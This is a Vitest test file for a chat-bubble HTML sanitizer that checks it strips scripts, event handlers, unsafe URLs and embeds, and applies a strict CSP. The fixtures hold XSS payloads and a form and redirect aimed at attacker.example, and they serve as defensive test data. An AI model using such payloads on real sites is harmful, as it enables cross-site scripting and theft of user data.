import { describe, expect, it } from "vitest";
import {
  buildChatBubbleDocument,
  CHAT_IFRAME_SANDBOX,
  sanitizeChatHtml,
} from "@/components/ChatHtmlBubble";

describe("ChatHtmlBubble HTML isolation", () => {
  it("removes executable and embedded content while retaining safe formatting", () => {
    const sanitized = sanitizeChatHtml(`
      <script>alert(document.domain)</script>
      <style>@import url(https://attacker.example/style.css)</style>
      <form action="https://attacker.example/collect"><input name="secret"></form>
      <object data="https://attacker.example/object"></object>
      <embed src="https://attacker.example/embed">
      <iframe src="https://attacker.example/frame"></iframe>
      <svg onload="alert(1)"><a href="javascript:alert(1)">svg</a></svg>
      <blockquote onclick="alert(1)" style="color:#93c5fd;position:fixed;background-image:url(javascript:alert(1))">
        <strong>Safe narrative text</strong>
      </blockquote>
    `);

    expect(sanitized).toContain("Safe narrative text");
    expect(sanitized).toContain("color:#93c5fd");
    expect(sanitized).not.toMatch(/<(?:script|style|form|input|object|embed|iframe|svg)\b/i);
    expect(sanitized).not.toMatch(/(?:onclick|onload|javascript:|background-image|position\s*:)/i);
  });

  it("allows only credential-free HTTPS links and images", () => {
    const sanitized = sanitizeChatHtml(`
      <a href="https://example.com/story?q=1">safe link</a>
      <a href="javascript:alert(1)">script link</a>
      <a href="data:text/html,boom">data link</a>
      <a href="/relative">relative link</a>
      <a href="https://user:password@example.com/private">credential link</a>
      <img src="https://cdn.example.com/image.png" alt="safe">
      <img src="data:image/svg+xml,<svg onload=alert(1) />" alt="data">
      <img src="http://example.com/insecure.png" alt="insecure">
    `);

    expect(sanitized).toContain("href=\"https://example.com/story?q=1\"");
    expect(sanitized).toContain("src=\"https://cdn.example.com/image.png\"");
    expect(sanitized).toContain("rel=\"nofollow noreferrer noopener\"");
    expect(sanitized).not.toMatch(/(?:javascript:|data:|http:\/\/|user:password)/i);
    expect(sanitized.match(/<img\b/g)).toHaveLength(1);
  });

  it("builds a script-free document with a restrictive CSP and no iframe privileges", () => {
    const document = buildChatBubbleDocument(`
      <p onmouseover="alert(1)">Formatted <em>response</em></p>
      <script>parent.location = "https://attacker.example"</script>
    `);

    expect(CHAT_IFRAME_SANDBOX).toBe("");
    expect(document).toContain("default-src 'none'");
    expect(document).toContain("script-src 'none'");
    expect(document).toContain("form-action 'none'");
    expect(document).toContain("Formatted <em>response</em>");
    expect(document).not.toMatch(/<script\b/i);
    expect(document).not.toMatch(/onmouseover|parent\.location/i);
  });

  it("retains native details markup and its initial open state", () => {
    const sanitized = sanitizeChatHtml(`
      <details open>
        <summary>Reasoning summary</summary>
        <p>Hidden narrative metadata</p>
      </details>
    `);

    expect(sanitized).toContain("<details open>");
    expect(sanitized).toContain("<summary>Reasoning summary</summary>");
  });
});
